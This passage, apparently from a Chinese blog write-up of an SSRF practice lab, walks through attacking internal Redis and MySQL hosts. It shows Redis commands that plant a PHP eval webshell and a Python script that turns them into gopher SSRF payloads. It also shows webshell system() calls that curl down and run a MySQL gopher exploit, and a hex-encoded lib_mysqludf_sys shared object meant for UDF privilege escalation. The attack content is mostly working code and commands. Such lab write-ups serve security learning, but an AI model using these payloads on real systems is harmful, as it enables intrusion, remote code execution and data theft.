</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>那这个文件包含就只能当作文件读取了，尝试读取redis配置文件里的密码</p> <p>redis常见配置文件目录</p> <table><thead><tr><th>路径</th> <th>说明</th></tr></thead> <tbody><tr><td><code>/etc/redis/redis.conf</code></td> <td>最常见的默认路径（Debian/Ubuntu）</td></tr> <tr><td><code>/etc/redis.conf</code></td> <td>有些系统直接放在 <code>/etc</code> 下面（比如 CentOS）</td></tr> <tr><td><code>/usr/local/etc/redis.conf</code></td> <td>源码安装时的默认路径</td></tr> <tr><td><code>/opt/redis/redis.conf</code></td> <td>有些定制服务手动安装时会放这里</td></tr></tbody></table> <p>测试发现，主机28redis配置文件在<code>/etc/redis.conf</code>，找到密码<code>P@ssw0rd</code></p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/20.png" alt="20"></p> <p>通过定时任务写入webshell</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>auth P@ssw0rd
flushall
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html/
config <span class="token builtin class-name">set</span> dbfilename <span class="token number">1</span>.php
<span class="token builtin class-name">set</span> x <span class="token string">&quot;&lt;?=highlight_file(__FILE__);eval(\<span class="token variable">$_GET</span>[1]);?&gt;&quot;</span>
save
quit
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><code>dict</code>协议一次只能执行一条redis命令，无密码的redis还好，一句一句执行，用来认证，就不能执行后续命令了。这里有密码，使用<code>gopher</code>协议，一次打爽</p> <div class="custom-block tip"><p class="custom-block-title">格式</p> <p>gopher://127.0.0.1:6379/_<em>payload</em></p></div> <p><strong>payload</strong>是构造好的 Redis 多个（十六进制或 URL 编码格式）</p> <p>redis协议格式</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>*参数个数\r\n
$参数1长度\r\n
参数1内容\r\n
$参数2长度\r\n
参数2内容\r\n
...
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>举个例子：<code>set x 123</code>就可以表示为：</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>*3\r\n
$3\r\n
set\r\n
$1\r\n
x\r\n
$3\r\n
123\r\n
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>把这条命令写成一个gopher协议</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>auth P@ssw0rd
flushall
config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html/
config <span class="token builtin class-name">set</span> dbfilename <span class="token number">1</span>.php
<span class="token builtin class-name">set</span> x <span class="token string">&quot;&lt;?=highlight_file(__FILE__);eval(<span class="token variable">$_GET</span>[1]);?&gt;&quot;</span>
save
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>python脚本生成gopher协议payload</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">def</span> <span class="token function">redis_payload</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
    <span class="token keyword">for</span> cmd <span class="token keyword">in</span> cmds<span class="token punctuation">:</span>
        parts <span class="token operator">=</span> cmd<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot; &quot;</span><span class="token punctuation">)</span>
        payload <span class="token operator">+=</span> <span class="token string">&quot;*%d\r\n&quot;</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>parts<span class="token punctuation">)</span>
        <span class="token keyword">for</span> p <span class="token keyword">in</span> parts<span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> <span class="token string">&quot;$%d\r\n%s\r\n&quot;</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    <span class="token keyword">return</span> quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment"># Redis命令集：写 WebShell 的流程</span>
cmds <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">&quot;auth P@ssw0rd&quot;</span><span class="token punctuation">,</span>  <span class="token comment"># 如果无密码，可删除此行</span>
    <span class="token string">&quot;flushall&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;config set dir /var/www/html/&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;config set dbfilename 1.php&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;set x \&quot;&lt;?=highlight_file(__FILE__);eval($_GET['1']);?&gt;\&quot;&quot;</span><span class="token punctuation">,</span>
    <span class="token string">&quot;save&quot;</span>
<span class="token punctuation">]</span>

ip <span class="token operator">=</span> <span class="token string">&quot;192.168.100.28&quot;</span>
port <span class="token operator">=</span> <span class="token number">6379</span>
<span class="token comment"># 一次编码：处理空格 %20</span>
payload <span class="token operator">=</span> redis_payload<span class="token punctuation">(</span>cmds<span class="token punctuation">)</span>
<span class="token comment"># 二次编码payload 处理斜杠根</span>
payload <span class="token operator">=</span> quote_plus<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;gopher://</span><span class="token interpolation"><span class="token punctuation">{</span>ip<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>port<span class="token punctuation">}</span></span><span class="token string">/_</span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><ul><li>使用 quote 编码 URL 路径部分，空格会被编码为 %20，不会编码斜杠。</li> <li>使用 quote_plus 编码 URL 查询参数部分，空格会被编码为 +，可以编码斜杠。</li></ul> <p>互补一下，刚刚好</p> <p>写入webshell</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/21.png" alt="21"></p> <h2 id="_192-168-100-29-3306-有密码认证mysql"><a href="#_192-168-100-29-3306-有密码认证mysql" class="header-anchor">#</a> 192.168.100.29:3306 有密码认证mysql</h2> <p>主机29上是一个mysql，dict协议探测，提示要密码，空密码也算密码吗？</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>mysql&gt; SELECT user, host, authentication_string FROM mysql.user WHERE user='root';
+------+-----------+-----------------------+
| user | host      | authentication_string |
+------+-----------+-----------------------+
| root | localhost |                       |
| root | %         |                       |
+------+-----------+-----------------------+
2 rows in set (0.02 sec)

mysql&gt; SELECT user, host, password FROM mysql.user;
+------+-----------+----------+
| user | host      | password |
+------+-----------+----------+
| root | localhost |          |
| root | %         |          |
+------+-----------+----------+
2 rows in set (0.00 sec)

mysql&gt; SELECT user, host, authentication_string FROM mysql.user;
+------+-----------+-----------------------+
| user | host      | authentication_string |
+------+-----------+-----------------------+
| root | localhost |                       |
| root | %         |                       |
+------+-----------+-----------------------+
2 rows in set (0.00 sec)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>想要打 MySQL 就需要知道 MySQL 通信时的 TCP 数据流，才能知道要怎么和 MySQL 通信，这里可以通过 大佬写的python脚本抓包来分析。项目地址<a href="https://github.com/FoolMitAh/mysql_gopher_attack" target="_blank" rel="noopener noreferrer">https://github.com/FoolMitAh/mysql_gopher_attack<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>这个脚本可以指定用户名、密码，那么说还能爆破有密码的mysql了？</p> <p>要抓取与主机29 mysql通信时的tcp流量，可能需要以下条件</p> <ul><li>可以通信 （内网主机）</li> <li>存在python环境 （使用大佬python脚本抓包）</li></ul> <p>在刚刚拿下的有密码认证的redis上，刚好存在python环境</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/22.png" alt="22"></p> <p>下载exp到主机28</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'curl -o exp.py https://raw.githubusercontent.com/FoolMitAh/mysql_gopher_attack/master/exploit.py;ls -lah'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 空格二次编码</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'curl%2520-o%2520exp.py%2520https://raw.githubusercontent.com/FoolMitAh/mysql_gopher_attack/master/exploit.py;ls%2520-lah'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/23.png" alt="23"></p> <p>在主机28上运行脚本，指定主机29，成功执行sql语句</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'python exp.py -t 192.168.100.29 -u root -p &quot;&quot; -d &quot;&quot; -P &quot;select now()&quot; -v -c &gt;1.txt;ls -lah;cat 1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 空格二次编码</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'python%2520exp.py%2520-t%2520192.168.100.29%2520-u%2520root%2520-p%2520&quot;&quot;%2520-d%2520&quot;&quot;%2520-P%2520&quot;select%2520now()&quot;%2520-v%2520-c%2520&gt;1.txt;ls%2520-lah;cat%25201.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/24.png" alt="24"></p> <p>尝试通过mysql udf提权RCE</p> <p>查询mysql插件目录<code>/usr/lib/mysql/plugin/</code></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'python exp.py -t 192.168.100.29 -u root -p &quot;&quot; -d &quot;&quot; -P &quot;SHOW VARIABLES LIKE \&quot;plugin_dir\&quot;;&quot; -v -c &gt;1.txt;ls -lah;cat 1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 空格二次编码 %编码</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28f/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'python%2520exp.py%2520-t%2520192.168.100.29%2520-u%2520root%2520-p%2520&quot;&quot;%2520-d%2520&quot;&quot;%2520-P%2520&quot;SHOW%2520VARIABLES%2520LIKE%2520\&quot;plugin_dir\&quot;;&quot;%2520-v%2520-c%2520&gt;1.txt;ls%2520-lah;cat%25201.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/25.png" alt="25"></p> <p>查询mysql版本、位数，64位mysql</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'python exp.py -t 192.168.100.29 -u root -p &quot;&quot; -d &quot;&quot; -P &quot;show variables like \&quot;%version%\&quot;;&quot; -v -c &gt;1.txt;ls -lah;cat 1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 空格二次编码，%编码</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'python%2520exp.py%2520-t%2520192.168.100.29%2520-u%2520root%2520-p%2520&quot;&quot;%2520-d%2520&quot;&quot;%2520-P%2520&quot;show%2520variables%2520like%2520\&quot;%25version%25\&quot;;&quot;%2520-v%2520-c%2520&gt;1.txt;ls%2520-lah;cat%25201.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/26.png" alt="26"></p> <p>在国光提供的udf提权网页找到合适的payload<a href="https://www.sqlsec.com/tools/udf.html" target="_blank" rel="noopener noreferrer">MySQL UDF 提权十六进制查询 | 国光<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>尝试写入udf so文件，写入失败，提示目录没有权限</p> <div class="language-plaintext line-numbers-mode"><pre class="language-plaintext"><code>----------------------------------------------------------------------------------------------------
| sql: select 111 into dumpfile &quot;/usr/lib/mysql/plugin/111111111&quot;; |
----------------------------------------------------------------------------------------------------
Result:  g�#HY000Can't create/write to file '/usr/lib/mysql/plugin/111111111' (Errcode: 13 - Permission denied)
----------------------------------------------------------------------------------------------------
sql:  select 111 into dumpfile &quot;/usr/lib/mysql/plugin/111111111&quot;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/27.png" alt="27"></p> <p>sql查询，安全配置的mysql是否有权限，验证一下</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'python%2520exp.py%2520-t%2520192.168.100.29%2520-u%2520root%2520-p%2520&quot;&quot;%2520-d%2520&quot;&quot;%2520-P%2520&quot;show%2520variables%2520like%2520\&quot;%2525secure_file_priv%2525\&quot;;&quot;%2520-v%2520-c%2520&gt;1.txt;ls%2520-lah;cat%25201.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>配置里是空，那么就是有写权限的</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/28.png" alt="28"></p> <p>进docker看看，在docker容器的入口脚本里，给插件目录777权限了，可能没生效？再执行一次</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/29.png" alt="29"></p> <p>再次尝试写文件，测试成功，可以写入文件了</p> <p><img src="/medias/%E5%9B%BD%E5%85%89ssrf/30.png" alt="30"></p> <p>写入恶意so文件</p> <details class="custom-block details"><summary>点击查看</summary> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># payload</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>http://192.168.100.28/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'python%2520exp.py%2520-t%2520192.168.100.29%2520-u%2520root%2520-p%2520&quot;&quot;%2520-d%2520&quot;&quot;%2520-P%2520&quot;SELECT%25200x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e